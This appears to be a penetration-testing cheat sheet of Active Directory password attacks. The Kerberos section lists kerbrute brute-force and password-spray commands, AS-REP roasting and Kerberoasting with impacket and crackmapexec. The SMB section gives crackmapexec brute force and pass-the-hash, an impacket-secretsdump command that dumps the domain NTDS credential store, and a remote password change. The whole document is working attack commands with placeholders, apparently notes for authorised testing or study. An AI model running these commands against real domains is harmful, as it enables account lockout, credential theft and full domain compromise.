# Passwords
## Kerberos
Brute force passwords - WILL LOCKOUT USER:
`kerbrute bruteuser --dc <IP> -d <DOMAIN> <PASSLIST> <USER>`

Check a password for userlist:
`kerbrute passwordspray --dc <IP> -d <DOMAIN> -v <USERLIST> <PASS>`

AS-REP (AS-REP Roasting):
`impacket-GetNPUsers -dc-ip <IP> <DOMAIN>/ -usersfile <USERLIST>` # --downgrade to get correct hash
`impacket-GetNPUsers -dc-ip <IP> <DOMAIN>/<USER>:<PASS> -request` # --downgrade to get correct hash
`crackmapexec ldap <IP> --kdcHost <IP> -u <USER> -p <PASS> --asreproast <OUTPUT>`

TGS-REP (Kerberoasting):
`impacket-GetUserSPNs -dc-ip <IP> <DOMAIN>/<USER>:<PASS> -request`
`crackmapexec ldap <IP> --kdcHost <IP> -u <USER> -p <PASS> --kerberoasting <OUTPUT>`

## SMB
Brute force passwords - WILL LOCKOUT USER:
`crackmapexec smb <IP> -u <USER> -p <PASSLIST>`
`crackmapexec smb <IP> -u <USER> -H <HASHES>`

Check password for users in list:
`crackmapexec smb <IP> -u <USERLIST> -p <PASS>`

If you have admin rights. Dump NTDS file:
`impacket-secretsdump '<DOMAIN>/<USER>:<PASS>@<IP>'`

Change password user:
`smbpasswd -U <USER> -r <DC_IP>`